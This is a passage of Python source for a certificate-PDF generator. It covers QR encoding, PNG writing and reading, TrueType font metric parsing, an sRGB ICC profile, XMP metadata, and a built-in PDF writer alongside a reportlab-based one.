            if cnt % 2:
                out.extend(_QR_ALNUM[take(6)].encode())
        elif mode == 0b0001:
            cnt = take(10 if ver <= 9 else 12 if ver <= 26 else 14)
            while cnt >= 3:
                out.extend(f"{take(10):03d}".encode())
                cnt -= 3
            if cnt == 2:
                out.extend(f"{take(7):02d}".encode())
            elif cnt == 1:
                out.extend(f"{take(4):d}".encode())
        elif mode == 0b0111:  # ECI designator: read and ignore
            take(8)
        else:
            raise ValueError(f"unsupported QR mode {mode:04b}")
    return bytes(out)


def qr_matrix(data: bytes, ecl: str = "M", prefer_library: bool = True) -> Tuple[List[List[bool]], str]:
    """Module matrix for data, from the `qrcode` package when present, else the built-in encoder."""
    if prefer_library and _qrcode_lib is not None:
        try:
            q = _qrcode_lib.QRCode(error_correction={"L": _qrcode_lib.constants.ERROR_CORRECT_L,
                                                     "M": _qrcode_lib.constants.ERROR_CORRECT_M,
                                                     "Q": _qrcode_lib.constants.ERROR_CORRECT_Q,
                                                     "H": _qrcode_lib.constants.ERROR_CORRECT_H}[ecl],
                                   box_size=1, border=0)
            q.add_data(data, optimize=0)
            q.make(fit=True)
            return [[bool(v) for v in row] for row in q.get_matrix()], f"qrcode {getattr(_qrcode_lib, '__version__', '')}".strip()
        except Exception:  # pragma: no cover - library quirk; fall back to the built-in encoder
            pass
    return qr_encode(data, ecl), "built-in ISO/IEC 18004 encoder"


# --------------------------------------------------------------------------- #
# PNG (grayscale, 8-bit) writer and reader                                    #
# --------------------------------------------------------------------------- #

def _png_chunk(tag: bytes, data: bytes) -> bytes:
    return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)


def png_from_matrix(matrix: Sequence[Sequence[bool]], scale: int = 8, border: int = 4) -> bytes:
    n = len(matrix)
    side = (n + 2 * border) * scale
    rows = bytearray()
    for py in range(side):
        my = py // scale - border
        rows.append(0)  # filter: none
        for px in range(side):
            mx = px // scale - border
            dark = 0 <= my < n and 0 <= mx < n and matrix[my][mx]
            rows.append(0 if dark else 255)
    ihdr = struct.pack(">IIBBBBB", side, side, 8, 0, 0, 0, 0)
    return (b"\x89PNG\r\n\x1a\n" + _png_chunk(b"IHDR", ihdr) +
            _png_chunk(b"IDAT", zlib.compress(bytes(rows), 9)) + _png_chunk(b"IEND", b""))


def png_read_gray(data: bytes) -> Tuple[int, int, List[bytearray]]:
    """Read an 8-bit grayscale, non-interlaced PNG; CRCs are checked. Returns (width, height, rows)."""
    if data[:8] != b"\x89PNG\r\n\x1a\n":
        raise ValueError("not a PNG file")
    pos, idat = 8, bytearray()
    w = h = 0
    while pos < len(data):
        (ln,) = struct.unpack(">I", data[pos:pos + 4])
        tag, body = data[pos + 4:pos + 8], data[pos + 8:pos + 8 + ln]
        (crc,) = struct.unpack(">I", data[pos + 8 + ln:pos + 12 + ln])
        if zlib.crc32(tag + body) & 0xFFFFFFFF != crc:
            raise ValueError(f"PNG CRC mismatch in {tag!r}")
        if tag == b"IHDR":
            w, h, depth, ctype, _c, _f, interlace = struct.unpack(">IIBBBBB", body)
            if depth != 8 or ctype != 0 or interlace:
                raise ValueError("only 8-bit grayscale non-interlaced PNG is supported")
        elif tag == b"IDAT":
            idat.extend(body)
        elif tag == b"IEND":
            break
        pos += 12 + ln
    raw = zlib.decompress(bytes(idat))
    rows, prev, stride = [], bytearray(w), w
    for r in range(h):
        ft, line = raw[r * (stride + 1)], bytearray(raw[r * (stride + 1) + 1:(r + 1) * (stride + 1)])
        for i in range(stride):
            a = line[i - 1] if i else 0
            b, c = prev[i], prev[i - 1] if i else 0
            if ft == 1:
                line[i] = (line[i] + a) & 0xFF
            elif ft == 2:
                line[i] = (line[i] + b) & 0xFF
            elif ft == 3:
                line[i] = (line[i] + (a + b) // 2) & 0xFF
            elif ft == 4:
                p = a + b - c
                pa, pb, pc = abs(p - a), abs(p - b), abs(p - c)
                line[i] = (line[i] + (a if pa <= pb and pa <= pc else b if pb <= pc else c)) & 0xFF
        rows.append(line)
        prev = line
    return w, h, rows


def matrix_from_png(data: bytes, modules: Optional[int] = None, border: int = 4) -> List[List[bool]]:
    """Sample module centres of a PNG written by png_from_matrix."""
    w, h, rows = png_read_gray(data)
    if w != h:
        raise ValueError("QR PNG is not square")
    if modules is None:  # first dark pixel on the centre-left row of the top-left finder
        top = next(y for y in range(h) if any(v < 128 for v in rows[y]))
        scale = next(x for x in range(w) if rows[top][x] < 128) // border
        modules = w // scale - 2 * border
    scale = w // (modules + 2 * border)
    return [[rows[(border + y) * scale + scale // 2][(border + x) * scale + scale // 2] < 128
             for x in range(modules)] for y in range(modules)]


# --------------------------------------------------------------------------- #
# Fonts: TrueType discovery and metrics (one metric source for both engines)  #
# --------------------------------------------------------------------------- #

_HELVETICA_W = (
    278, 278, 355, 556, 556, 889, 667, 191, 333, 333, 389, 584, 278, 333, 278, 278, 556, 556, 556, 556, 556, 556, 556,
    556, 556, 556, 278, 278, 584, 584, 584, 556, 1015, 667, 667, 722, 722, 667, 611, 778, 722, 278, 500, 667, 556, 833,
    722, 778, 667, 778, 722, 667, 611, 722, 667, 944, 667, 667, 611, 278, 278, 278, 469, 556, 333, 556, 556, 500, 556,
    556, 278, 556, 556, 222, 222, 500, 222, 833, 556, 556, 556, 556, 333, 500, 278, 556, 500, 722, 500, 500, 500, 334,
    260, 334, 584, 761, 556, 0, 222, 556, 333, 1000, 556, 556, 333, 1000, 667, 333, 1000, 0, 611, 0, 0, 222, 222, 333,
    333, 350, 556, 1000, 333, 1000, 500, 333, 944, 0, 500, 667, 278, 333, 556, 556, 556, 556, 260, 556, 333, 737, 370,
    556, 584, 333, 737, 333, 400, 584, 333, 333, 333, 556, 537, 278, 333, 333, 365, 556, 834, 834, 834, 611, 667, 667,
    667, 667, 667, 667, 1000, 722, 667, 667, 667, 667, 278, 278, 278, 278, 722, 722, 778, 778, 778, 778, 778, 584, 778,
    722, 722, 722, 722, 667, 667, 611, 556, 556, 556, 556, 556, 556, 889, 500, 556, 556, 556, 556, 278, 278, 278, 278,
    556, 556, 556, 556, 556, 556, 556, 584, 611, 556, 556, 556, 556, 500, 556, 500)
_HELVETICA_BOLD_W = (
    278, 333, 474, 556, 556, 889, 722, 238, 333, 333, 389, 584, 278, 333, 278, 278, 556, 556, 556, 556, 556, 556, 556,
    556, 556, 556, 333, 333, 584, 584, 584, 611, 975, 722, 722, 722, 722, 667, 611, 778, 722, 278, 556, 722, 611, 833,
    722, 778, 667, 778, 722, 667, 611, 722, 667, 944, 667, 667, 611, 333, 278, 333, 584, 556, 333, 556, 611, 556, 611,
    556, 333, 611, 611, 278, 278, 556, 278, 889, 611, 611, 611, 611, 389, 556, 333, 611, 556, 778, 556, 556, 500, 389,
    280, 389, 584, 761, 556, 0, 278, 556, 500, 1000, 556, 556, 333, 1000, 667, 333, 1000, 0, 611, 0, 0, 278, 278, 500,
    500, 350, 556, 1000, 333, 1000, 556, 333, 944, 0, 500, 667, 278, 333, 556, 556, 556, 556, 280, 556, 333, 737, 370,
    556, 584, 333, 737, 333, 400, 584, 333, 333, 333, 611, 556, 278, 333, 333, 365, 556, 834, 834, 834, 611, 722, 722,
    722, 722, 722, 722, 1000, 722, 667, 667, 667, 667, 278, 278, 278, 278, 722, 722, 778, 778, 778, 778, 778, 584, 778,
    722, 722, 722, 722, 667, 667, 611, 556, 556, 556, 556, 556, 556, 889, 556, 556, 556, 556, 556, 278, 278, 278, 278,
    611, 611, 611, 611, 611, 611, 611, 584, 611, 611, 611, 611, 611, 556, 611, 556)

_FONT_FAMILIES = (
    # (regular, bold, mono) candidates; the first complete set wins
    (r"C:\Windows\Fonts\arial.ttf", r"C:\Windows\Fonts\arialbd.ttf", r"C:\Windows\Fonts\consola.ttf"),
    (r"C:\Windows\Fonts\arial.ttf", r"C:\Windows\Fonts\arialbd.ttf", r"C:\Windows\Fonts\cour.ttf"),
    ("/usr/share/fonts/truetype/liberation2/LiberationSans-Regular.ttf",
     "/usr/share/fonts/truetype/liberation2/LiberationSans-Bold.ttf",
     "/usr/share/fonts/truetype/liberation2/LiberationMono-Regular.ttf"),
    ("/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
     "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
     "/usr/share/fonts/truetype/liberation/LiberationMono-Regular.ttf"),
    ("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
     "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"),
    ("/Library/Fonts/Arial.ttf", "/Library/Fonts/Arial Bold.ttf", "/Library/Fonts/Courier New.ttf"),
    ("/System/Library/Fonts/Supplemental/Arial.ttf", "/System/Library/Fonts/Supplemental/Arial Bold.ttf",
     "/System/Library/Fonts/Supplemental/Courier New.ttf"),
)


class TrueTypeMetrics:
    """The few TrueType tables a PDF writer needs: widths for WinAnsi codes and descriptor metrics."""

    def __init__(self, path: str):
        with open(path, "rb") as f:
            self.data = f.read()
        self.path = path
        d = self.data
        if d[:4] not in (b"\x00\x01\x00\x00", b"true"):
            raise ValueError(f"{path}: not a TrueType (glyf) font")
        (num,) = struct.unpack(">H", d[4:6])
        self.tables = {}
        for i in range(num):
            tag, _cs, off, ln = struct.unpack(">4sIII", d[12 + 16 * i:28 + 16 * i])
            self.tables[tag.decode("latin-1")] = (off, ln)
        for t in ("head", "hhea", "hmtx", "cmap", "OS/2", "post", "glyf"):
            if t not in self.tables:
                raise ValueError(f"{path}: missing {t} table")
        head = self._t("head")
        self.units = struct.unpack(">H", head[18:20])[0]
        self.bbox = struct.unpack(">hhhh", head[36:44])
        hhea = self._t("hhea")
        self.ascent, self.descent = struct.unpack(">hh", hhea[4:8])
        n_hm = struct.unpack(">H", hhea[34:36])[0]
        hmtx = self._t("hmtx")
        self.advances = [struct.unpack(">H", hmtx[4 * i:4 * i + 2])[0] for i in range(n_hm)]
        os2 = self._t("OS/2")
        self.fs_type = struct.unpack(">H", os2[8:10])[0]
        version = struct.unpack(">H", os2[0:2])[0]
        self.cap_height = struct.unpack(">h", os2[88:90])[0] if version >= 2 and len(os2) >= 90 else int(self.ascent * 0.7)
        post = self._t("post")
        self.italic_angle = struct.unpack(">i", post[4:8])[0] / 65536.0
        self.cmap = self._cmap4()
        if self.fs_type & 0x0002:
            raise ValueError(f"{path}: licence forbids embedding (fsType restricted)")
        self.widths = []
        for code in range(32, 256):
            try:
                ch = bytes([code]).decode("cp1252")
            except UnicodeDecodeError:
                self.widths.append(0)
                continue
            gid = self.cmap.get(ord(ch), 0)
            adv = self.advances[min(gid, len(self.advances) - 1)]
            self.widths.append(int(round(adv * 1000 / self.units)))

    def _t(self, tag: str) -> bytes:
        off, ln = self.tables[tag]
        return self.data[off:off + ln]

    def _cmap4(self) -> Dict[int, int]:
        cm = self._t("cmap")
        (n,) = struct.unpack(">H", cm[2:4])
        for i in range(n):
            pid, eid, off = struct.unpack(">HHI", cm[4 + 8 * i:12 + 8 * i])
            if pid == 3 and eid == 1 and struct.unpack(">H", cm[off:off + 2])[0] == 4:
                sub = cm[off:]
                segx2 = struct.unpack(">H", sub[6:8])[0]
                seg = segx2 // 2
                ends = struct.unpack(f">{seg}H", sub[14:14 + segx2])
                starts = struct.unpack(f">{seg}H", sub[16 + segx2:16 + 2 * segx2])
                deltas = struct.unpack(f">{seg}h", sub[16 + 2 * segx2:16 + 3 * segx2])
                ro_pos = 16 + 3 * segx2
                ranges = struct.unpack(f">{seg}H", sub[ro_pos:ro_pos + segx2])
                out: Dict[int, int] = {}
                for s in range(seg):
                    for c in range(starts[s], min(ends[s], 0x2122) + 1):
                        if c > 0x2122:
                            break
                        if ranges[s] == 0:
                            g = (c + deltas[s]) & 0xFFFF
                        else:
                            p = ro_pos + 2 * s + ranges[s] + 2 * (c - starts[s])
                            g = struct.unpack(">H", sub[p:p + 2])[0]
                            if g:
                                g = (g + deltas[s]) & 0xFFFF
                        if g:
                            out[c] = g
                return out
        raise ValueError(f"{self.path}: no Windows Unicode (3,1) format 4 cmap")

    def scaled(self, v: float) -> int:
        return int(round(v * 1000 / self.units))


class FontSet:
    """Regular, bold and monospace faces: embedded TrueType when found, else the base-14 fonts."""

    KEYS = ("R", "B", "M")

    def __init__(self, embed: bool = True, paths: Optional[Sequence[str]] = None):
        self.ttf: Dict[str, TrueTypeMetrics] = {}
        self.notes: List[str] = []
        env = os.environ.get("SUTRA_PDF_FONTS")
        candidates: List[Sequence[str]] = []
        if paths:
            candidates.append(paths)
        if env:
            candidates.append(env.split(os.pathsep if os.pathsep in env and ";" not in env else ";"))
        candidates.extend(_FONT_FAMILIES)
        if embed:
            for fam in candidates:
                if len(fam) != 3 or not all(os.path.isfile(p) for p in fam):
                    continue
                try:
                    self.ttf = {k: TrueTypeMetrics(p) for k, p in zip(self.KEYS, fam)}
                    break
                except (OSError, ValueError, struct.error) as e:
                    self.notes.append(str(e))
                    self.ttf = {}
        self.embedded = len(self.ttf) == 3

    def base14(self, key: str) -> str:
        return {"R": "Helvetica", "B": "Helvetica-Bold", "M": "Courier"}[key]

    def pdf_name(self, key: str) -> str:
        if self.embedded:
            return {"R": "SutraSans", "B": "SutraSans-Bold", "M": "SutraMono"}[key]
        return self.base14(key)

    def describe(self) -> str:
        if self.embedded:
            return "embedded TrueType: " + ", ".join(os.path.basename(self.ttf[k].path) for k in self.KEYS)
        return "base-14 (Helvetica / Courier), not embedded"

    def width(self, text: str, key: str, size: float) -> float:
        enc = text.encode("cp1252", "replace")
        if self.embedded:
            w = self.ttf[key].widths
        elif key == "M":
            return 0.6 * size * len(enc)
        else:
            w = _HELVETICA_BOLD_W if key == "B" else _HELVETICA_W
        return sum(w[c - 32] if c >= 32 else 0 for c in enc) * size / 1000.0


def pdf_safe(text: Any) -> str:
    """Text as the certificate prints it: WinAnsi (cp1252) characters only."""
    s = str(text).replace("\u2192", "->").replace("\u2264", "<=").replace("\u2265", ">=").replace("\u20b9", "INR ")
    s = s.replace("\u2212", "-").replace("\u00a0", " ").replace("\t", " ")
    return s.encode("cp1252", "replace").decode("cp1252")


# --------------------------------------------------------------------------- #
# sRGB ICC profile (ICC v2 display profile) for the PDF/A OutputIntent        #
# --------------------------------------------------------------------------- #

def _s15(v: float) -> bytes:
    return struct.pack(">i", int(round(v * 65536)))


def srgb_icc_profile() -> bytes:
    def xyz(x: float, y: float, z: float) -> bytes:
        return b"XYZ " + bytes(4) + _s15(x) + _s15(y) + _s15(z)

    desc_txt = b"sRGB IEC61966-2.1 (SUTRA-Trace)\x00"
    desc = b"desc" + bytes(4) + struct.pack(">I", len(desc_txt)) + desc_txt + bytes(4 + 4) + bytes(2 + 1 + 67)
    curv = b"curv" + bytes(4) + struct.pack(">I", 1) + struct.pack(">H", 0x0233) + bytes(2)  # gamma 2.2 (u8.8)
    tags = [(b"desc", desc), (b"cprt", b"text" + bytes(4) + b"No copyright, use freely\x00"),
            (b"wtpt", xyz(0.9642, 1.0, 0.8249)),
            (b"rXYZ", xyz(0.4361, 0.2225, 0.0139)), (b"gXYZ", xyz(0.3851, 0.7169, 0.0971)),
            (b"bXYZ", xyz(0.1431, 0.0606, 0.7141)),
            (b"rTRC", curv), (b"gTRC", curv), (b"bTRC", curv)]
    table_len = 4 + 12 * len(tags)
    offset = 128 + table_len
    entries, blobs = b"", b""
    seen: Dict[bytes, Tuple[int, int]] = {}
    for sig, body in tags:
        if body in seen:  # shared TRC body
            o, ln = seen[body]
        else:
            pad = (-len(blobs)) % 4
            blobs += bytes(pad)
            o, ln = offset + len(blobs), len(body)
            blobs += body
            seen[body] = (o, ln)
        entries += sig + struct.pack(">II", o, ln)
    body = struct.pack(">I", len(tags)) + entries + blobs
    size = 128 + len(body)
    header = (struct.pack(">I", size) + b"\x00\x00\x00\x00" + struct.pack(">I", 0x02100000) + b"mntrRGB XYZ " +
              struct.pack(">6H", 2026, 1, 1, 0, 0, 0) + b"acsp" + b"\x00\x00\x00\x00" + struct.pack(">I", 0) +
              bytes(4) + bytes(4) + bytes(8) + struct.pack(">I", 0) + _s15(0.9642) + _s15(1.0) + _s15(0.8249) +
              bytes(4) + bytes(16) + bytes(28))
    assert len(header) == 128
    return header + body


# --------------------------------------------------------------------------- #
# Page recorder: layout draws here once; either engine replays it             #
# --------------------------------------------------------------------------- #

def _rgb(hex_color: str) -> Tuple[float, float, float]:
    h = hex_color.lstrip("#")
    return tuple(int(h[i:i + 2], 16) / 255.0 for i in (0, 2, 4))  # type: ignore[return-value]


class PageRecorder:
    """Vector drawing operations per page plus a text log (what was printed where)."""

    def __init__(self, fonts: FontSet, page_w: float = 595.2756, page_h: float = 841.8898):
        self.fonts = fonts
        self.w, self.h = page_w, page_h
        self.pages: List[List[Tuple[Any, ...]]] = []
        self.outlines: List[Tuple[str, int]] = []
        self.text_log: List[Dict[str, Any]] = []

    def new_page(self) -> int:
        self.pages.append([])
        return len(self.pages)

    @property
    def page_no(self) -> int:
        return len(self.pages)

    def width(self, text: str, key: str, size: float) -> float:
        return self.fonts.width(text, key, size)

    def fill_rect(self, x: float, y: float, w: float, h: float, color: str) -> None:
        self.pages[-1].append(("fill_rect", x, y, w, h, color))

    def stroke_rect(self, x: float, y: float, w: float, h: float, color: str, lw: float = 0.6) -> None:
        self.pages[-1].append(("stroke_rect", x, y, w, h, color, lw))

    def line(self, x1: float, y1: float, x2: float, y2: float, color: str, lw: float = 0.6) -> None:
        self.pages[-1].append(("line", x1, y1, x2, y2, color, lw))

    def text(self, x: float, y: float, s: str, key: str = "R", size: float = 8.0, color: str = PALETTE["text"],
             align: str = "left") -> float:
        s = pdf_safe(s)
        w = self.width(s, key, size)
        if align == "right":
            x -= w
        elif align == "center":
            x -= w / 2
        self.pages[-1].append(("text", x, y, s, key, size, color))
        self.text_log.append({"page": self.page_no, "x": round(x, 2), "y": round(y, 2), "w": round(w, 2),
                              "size": size, "font": key, "text": s})
        return w

    def qr(self, x: float, y: float, module: float, matrix: Sequence[Sequence[bool]], color: str) -> None:
        self.pages[-1].append(("qr", x, y, module, [list(r) for r in matrix], color))

    def outline(self, title: str) -> None:
        self.outlines.append((pdf_safe(title), self.page_no))

    def page_text(self, page: int) -> str:
        return "\n".join(t["text"] for t in self.text_log if t["page"] == page)


def _qr_runs(matrix: Sequence[Sequence[bool]]) -> List[Tuple[int, int, int]]:
    """Horizontal dark runs as (column, row-from-bottom, length) in module units."""
    n = len(matrix)
    runs = []
    for r, row in enumerate(matrix):
        c = 0
        while c < n:
            if row[c]:
                s = c
                while c < n and row[c]:
                    c += 1
                runs.append((s, n - 1 - r, c - s))
            else:
                c += 1
    return runs


def _num(v: float) -> str:
    s = f"{v:.4f}".rstrip("0").rstrip(".")
    return "0" if s in ("-0", "") else s


def _pdf_date(dt: datetime.datetime) -> str:
    d = dt.astimezone(IST)
    return d.strftime("D:%Y%m%d%H%M%S+05'30'")


def _xmp_date(dt: datetime.datetime) -> str:
    return dt.astimezone(IST).strftime("%Y-%m-%dT%H:%M:%S+05:30")


def _xml_esc(s: str) -> str:
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")


def xmp_packet(meta: Dict[str, Any], pdfa: bool) -> bytes:
    created = meta["created"]
    pdfaid = ('  <rdf:Description rdf:about="" xmlns:pdfaid="http://www.aiim.org/pdfa/ns/id/">\n'
              '   <pdfaid:part>1</pdfaid:part>\n   <pdfaid:conformance>B</pdfaid:conformance>\n'
              '  </rdf:Description>\n') if pdfa else ""
    body = (
        '<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>\n'
        '<x:xmpmeta xmlns:x="adobe:ns:meta/">\n <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n'
        f'{pdfaid}'
        '  <rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">\n'
        '   <dc:format>application/pdf</dc:format>\n'
        f'   <dc:title><rdf:Alt><rdf:li xml:lang="x-default">{_xml_esc(meta["title"])}</rdf:li></rdf:Alt></dc:title>\n'
        f'   <dc:creator><rdf:Seq><rdf:li>{_xml_esc(meta["author"])}</rdf:li></rdf:Seq></dc:creator>\n'
        f'   <dc:description><rdf:Alt><rdf:li xml:lang="x-default">{_xml_esc(meta["subject"])}</rdf:li></rdf:Alt></dc:description>\n'
        '  </rdf:Description>\n'
        '  <rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/">\n'
        f'   <xmp:CreateDate>{_xmp_date(created)}</xmp:CreateDate>\n'
        f'   <xmp:ModifyDate>{_xmp_date(created)}</xmp:ModifyDate>\n'
        f'   <xmp:MetadataDate>{_xmp_date(created)}</xmp:MetadataDate>\n'
        f'   <xmp:CreatorTool>{_xml_esc(meta["creator"])}</xmp:CreatorTool>\n'
        '  </rdf:Description>\n'
        '  <rdf:Description rdf:about="" xmlns:pdf="http://ns.adobe.com/pdf/1.3/">\n'
        f'   <pdf:Producer>{_xml_esc(meta["producer"])}</pdf:Producer>\n'
        f'   <pdf:Keywords>{_xml_esc(meta["keywords"])}</pdf:Keywords>\n'
        '  </rdf:Description>\n'
        ' </rdf:RDF>\n</x:xmpmeta>\n' + " " * 1200 + '\n<?xpacket end="w"?>')
    return body.encode("utf-8")


def _pdf_str(s: str) -> bytes:
    """PDF literal string from WinAnsi text."""
    raw = pdf_safe(s).encode("cp1252", "replace")
    return b"(" + raw.replace(b"\\", b"\\\\").replace(b"(", b"\\(").replace(b")", b"\\)").replace(b"\r", b"\\r") + b")"


def _info_dict(meta: Dict[str, Any]) -> bytes:
    d = _pdf_date(meta["created"])
    return (b"<< /Title " + _pdf_str(meta["title"]) + b" /Author " + _pdf_str(meta["author"]) +
            b" /Subject " + _pdf_str(meta["subject"]) + b" /Keywords " + _pdf_str(meta["keywords"]) +
            b" /Creator " + _pdf_str(meta["creator"]) + b" /Producer " + _pdf_str(meta["producer"]) +
            b" /CreationDate " + _pdf_str(d) + b" /ModDate " + _pdf_str(d) + b" >>")


# --------------------------------------------------------------------------- #
# Engine 1: built-in PDF writer                                               #
# --------------------------------------------------------------------------- #

class PurePdfWriter:
    """Writes a PageRecorder as PDF 1.4 with Flate streams, embedded TrueType (full font) or base-14."""

    engine = "built-in PDF writer"

    def __init__(self, fonts: FontSet):
        self.fonts = fonts

    def _content(self, ops: List[Tuple[Any, ...]]) -> bytes:
        out: List[str] = []
        for op in ops:
            kind = op[0]
            if kind == "fill_rect":
                _, x, y, w, h, c = op
                out.append("%s %s %s rg %s %s %s %s re f" % (*map(_num, _rgb(c)), _num(x), _num(y), _num(w), _num(h)))
            elif kind == "stroke_rect":
                _, x, y, w, h, c, lw = op
                out.append("%s w %s %s %s RG %s %s %s %s re S" % (_num(lw), *map(_num, _rgb(c)), _num(x), _num(y),
                                                                  _num(w), _num(h)))
            elif kind == "line":
                _, x1, y1, x2, y2, c, lw = op
                out.append("%s w %s %s %s RG %s %s m %s %s l S" % (_num(lw), *map(_num, _rgb(c)), _num(x1), _num(y1),
                                                                   _num(x2), _num(y2)))
            elif kind == "text":
                _, x, y, s, key, size, c = op
                fid = {"R": "F1", "B": "F2", "M": "F3"}[key]
                out.append("BT /%s %s Tf %s %s %s rg 1 0 0 1 %s %s Tm %s Tj ET" % (
                    fid, _num(size), *map(_num, _rgb(c)), _num(x), _num(y), _pdf_str(s).decode("latin-1")))
            elif kind == "qr":
                _, x, y, m, matrix, c = op
                out.append("q 1 0 0 1 %s %s cm %s 0 0 %s 0 0 cm %s %s %s rg" % (_num(x), _num(y), _num(m), _num(m),
                                                                                *map(_num, _rgb(c))))
                out.extend("%d %d %d 1 re f" % r for r in _qr_runs(matrix))
                out.append("Q")
        return "\n".join(out).encode("latin-1")

    def write(self, rec: PageRecorder, path: str, meta: Dict[str, Any], pdfa: bool) -> Dict[str, Any]:
        objs: List[bytes] = []

        def add(body: bytes) -> int:
            objs.append(body)
            return len(objs)

        def stream(dict_extra: bytes, data: bytes, compress: bool = True) -> bytes:
            if compress:
                data = zlib.compress(data, 9)
                dict_extra += b" /Filter /FlateDecode"
            return b"<< /Length %d%s >>\nstream\n" % (len(data), dict_extra) + data + b"\nendstream"

        catalog = add(b"")  # filled last
        pages_id = add(b"")
        font_ids = {}
        for key in FontSet.KEYS:
            name = self.fonts.pdf_name(key).encode()
            if self.fonts.embedded:
                t = self.fonts.ttf[key]
                ff = add(stream(b" /Length1 %d" % len(t.data), t.data))
                flags = 32 | (1 if key == "M" else 0)
                bb = " ".join(str(t.scaled(v)) for v in t.bbox).encode()
                fd = add(b"<< /Type /FontDescriptor /FontName /%s /Flags %d /FontBBox [%s] /ItalicAngle %s "
                         b"/Ascent %d /Descent %d /CapHeight %d /StemV %d /MissingWidth %d /FontFile2 %d 0 R >>" % (
                             name, flags, bb, _num(t.italic_angle).encode(), t.scaled(t.ascent), t.scaled(t.descent),
                             t.scaled(t.cap_height), 120 if key == "B" else 80, t.scaled(t.advances[0]), ff))
                widths = " ".join(str(w) for w in t.widths).encode()
                font_ids[key] = add(b"<< /Type /Font /Subtype /TrueType /BaseFont /%s /FirstChar 32 /LastChar 255 "
                                    b"/Widths [%s] /Encoding /WinAnsiEncoding /FontDescriptor %d 0 R >>" % (
                                        name, widths, fd))
            else:
                font_ids[key] = add(b"<< /Type /Font /Subtype /Type1 /BaseFont /%s /Encoding /WinAnsiEncoding >>" % name)
        res = add(b"<< /Font << /F1 %d 0 R /F2 %d 0 R /F3 %d 0 R >> /ProcSet [/PDF /Text] >>" % (
            font_ids["R"], font_ids["B"], font_ids["M"]))
        page_ids = []
        for ops in rec.pages:
            cid = add(stream(b"", self._content(ops)))
            page_ids.append(add(b"<< /Type /Page /Parent %d 0 R /MediaBox [0 0 %s %s] /Resources %d 0 R "
                                b"/Contents %d 0 R >>" % (pages_id, _num(rec.w).encode(), _num(rec.h).encode(),
                                                          res, cid)))
        objs[pages_id - 1] = b"<< /Type /Pages /Kids [%s] /Count %d >>" % (
            b" ".join(b"%d 0 R" % p for p in page_ids), len(page_ids))
        outline_ref = b""
        if rec.outlines:
            root_id = len(objs) + 1
            add(b"")
            item_ids = []
            for _ in rec.outlines:
                item_ids.append(add(b""))
            for i, (title, page) in enumerate(rec.outlines):
                links = b""
                if i > 0:
                    links += b" /Prev %d 0 R" % item_ids[i - 1]
                if i + 1 < len(item_ids):
                    links += b" /Next %d 0 R" % item_ids[i + 1]
                objs[item_ids[i] - 1] = (b"<< /Title " + _pdf_str(title) + b" /Parent %d 0 R%s /Dest [%d 0 R /Fit] >>"
                                         % (root_id, links, page_ids[page - 1]))
            objs[root_id - 1] = b"<< /Type /Outlines /First %d 0 R /Last %d 0 R /Count %d >>" % (
                item_ids[0], item_ids[-1], len(item_ids))
            outline_ref = b" /Outlines %d 0 R /PageMode /UseOutlines" % root_id
        meta_id = add(stream(b" /Type /Metadata /Subtype /XML", xmp_packet(meta, pdfa), compress=False))
        intent_ref = b""
        if pdfa:
            icc = add(stream(b" /N 3", srgb_icc_profile()))
            oi = add(b"<< /Type /OutputIntent /S /GTS_PDFA1 /OutputConditionIdentifier (sRGB IEC61966-2.1) "
                     b"/Info (sRGB IEC61966-2.1) /DestOutputProfile %d 0 R >>" % icc)
            intent_ref = b" /OutputIntents [%d 0 R]" % oi
        info_id = add(_info_dict(meta))
        objs[catalog - 1] = b"<< /Type /Catalog /Pages %d 0 R /Metadata %d 0 R%s%s >>" % (
            pages_id, meta_id, outline_ref, intent_ref)

        out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
        offsets = []
        for i, body in enumerate(objs, 1):
            offsets.append(len(out))
            out += b"%d 0 obj\n" % i + body + b"\nendobj\n"
        xref = len(out)
        out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
        for off in offsets:
            out += b"%010d 00000 n \n" % off
        fid = hashlib.md5(bytes(out)).hexdigest().encode()
        out += (b"trailer\n<< /Size %d /Root %d 0 R /Info %d 0 R /ID [<%s> <%s>] >>\nstartxref\n%d\n%%%%EOF\n"
                % (len(objs) + 1, catalog, info_id, fid, fid, xref))
        with open(path, "wb") as f:
            f.write(out)
        return {"engine": self.engine, "pages": len(rec.pages), "fonts": self.fonts.describe()}


# --------------------------------------------------------------------------- #
# Engine 2: reportlab, with the PDF/A catalog entries added as an incremental #
# update (reportlab's open-source canvas does not write them)                 #
# --------------------------------------------------------------------------- #

class ReportLabWriter:
    engine = "reportlab"

    def __init__(self, fonts: FontSet):
        if not _HAVE_REPORTLAB:
            raise RuntimeError("reportlab is not installed")
        self.fonts = fonts
        if fonts.embedded:
            for key in FontSet.KEYS:
                name = fonts.pdf_name(key)
                if name not in _rl_metrics.getRegisteredFontNames():
                    _rl_metrics.registerFont(_RLTTFont(name, fonts.ttf[key].path))

    def write(self, rec: PageRecorder, path: str, meta: Dict[str, Any], pdfa: bool) -> Dict[str, Any]:
        orig = _rl_pdfdoc.PDFStream.format

        def eol_before_endstream(stream_self: Any, document: Any) -> bytes:
            # PDF/A-1 (ISO 19005-1, 6.1.7): an EOL must precede 'endstream'; reportlab writes none.
            out = orig(stream_self, document)
            return out[:-10] + b"\nendstream\n" if out.endswith(b"endstream\n") and not out.endswith(
                b"\nendstream\n") else out

        _rl_pdfdoc.PDFStream.format = eol_before_endstream
        try:
            return self._write(rec, path, meta, pdfa)
        finally:
            _rl_pdfdoc.PDFStream.format = orig

    def _write(self, rec: PageRecorder, path: str, meta: Dict[str, Any], pdfa: bool) -> Dict[str, Any]:
        fname = {k: self.fonts.pdf_name(k) for k in FontSet.KEYS}
        c = _rl_canvas.Canvas(path, pagesize=(rec.w, rec.h), pageCompression=1, invariant=1,
